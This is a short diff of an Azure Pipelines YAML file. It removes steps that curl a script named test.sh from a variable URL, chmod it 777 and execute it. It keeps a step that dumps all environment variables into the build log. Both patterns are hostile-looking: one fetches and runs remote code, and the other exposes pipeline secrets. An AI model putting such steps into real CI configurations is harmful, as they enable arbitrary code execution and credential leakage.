@@ -15,13 +15,5 @@ steps:
       echo ##vso[artifact.associate artifactname=myDrop;artifacttype=myartifacttype]https://github.com/Legit-Labs/legitify/archive/refs/tags/v0.2.2.zip
       env | sort
     displayName: Display data
-  - script: |
-      echo "Url to verify: $(varificationUrl)"
-      curl $(varificationUrl)/test.sh --output test.sh
-      chmod 777 test.sh
-    displayName: Download script
-  - bash: "./test.sh"
-  - script: |
-      ls -la
 
   
